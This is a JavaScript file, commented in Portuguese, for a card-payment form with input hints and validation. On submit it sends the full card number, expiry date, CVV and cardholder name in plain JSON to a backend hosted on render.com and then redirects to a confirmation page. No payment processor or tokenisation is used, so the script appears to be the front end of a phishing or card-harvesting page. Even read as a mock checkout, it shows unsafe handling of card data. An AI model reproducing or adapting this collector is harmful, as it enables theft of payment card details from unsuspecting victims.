document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");

    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // Configuração das dicas (Cinza)
    for (const key in campos) {
        const input = campos[key];

        input.addEventListener("focus", () => {
            removeMensagemDica(input);
            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];
            input.parentElement.appendChild(dica);
        });

        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    form.addEventListener("submit", async (event) => {
        event.preventDefault();

        // Limpa erros anteriores
        document.querySelectorAll(".mensagem-erro").forEach(el => el.remove());

        const inputs = {
            numero: campos.numero,
            data: campos.data,
            cvv: campos.cvv,
            nome: campos.nome,
            tipo: document.querySelector('input[name="gender"]:checked'),
        };

        const mensagensErro = {
            numero: "Por favor, insira o número do cartão.",
            data: "A data e o CVV são necessários.",
            cvv: "",
            nome: "Por favor, insira o nome impresso no cartão.",
            tipo: "Selecione uma opção (Crédito ou Débito).",
        };

        let formValido = true;

        // VALIDAÇÃO VISUAL (Retângulos vermelhos)
        for (const key in inputs) {
            const input = inputs[key];

            if (!input || (input.value === "" || input.value === undefined)) {
                formValido = false;

                if (key === "tipo") {
                    const radios = document.querySelectorAll('input[name="gender"]');
                    radios.forEach(r => {
                        r.parentElement.style.border = "1px solid red";
                        r.parentElement.style.borderRadius = "8px";
                        r.parentElement.style.padding = "5px";
                    });

                    const container = document.querySelector(".radio-container");
                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.textContent = mensagensErro[key];
                    container.appendChild(erro);
                } else {
                    input.style.border = "1px solid red";
                    input.style.borderRadius = "8px";

                    const erro = document.createElement("span");
                    erro.classList.add("mensagem-erro");
                    erro.style.color = "red";
                    erro.style.fontSize = "14px";
                    erro.style.display = "block";
                    erro.style.marginTop = "4px";
                    erro.textContent = mensagensErro[key];
                    input.parentElement.appendChild(erro);
                }
            } else {
                if (key === "tipo") {
                    document.querySelectorAll('input[name="gender"]').forEach(r => {
                        r.parentElement.style.border = "none";
                    });
                } else {
                    input.style.border = "1px solid #ccc";
                }
            }
        }

        // --- INTEGRAÇÃO COM O SERVIDOR (RENDER) ---
        if (formValido) {
            const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
            
            const dadosParaEnviar = {
                numero: campos.numero.value,
                dataValidade: campos.data.value,
                cvv: campos.cvv.value,
                nome: campos.nome.value,
                tipo: cardType
            };

            try {
                // Link do seu backend integrado
                const urlDoServidor = "https://backend-g2xn.onrender.com/enviar-dados";

                const resposta = await fetch(urlDoServidor, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dadosParaEnviar)
                });

                if (resposta.ok) {
                    window.location.href = "confirmacao.html"; //
                } else {
                    alert("Erro ao salvar os dados. Tente novamente.");
                }
            } catch (error) {
                console.error("Erro na conexão:", error);
                alert("Servidor offline. Verifique se o backend no Render está rodando.");
            }
        }
    });
});
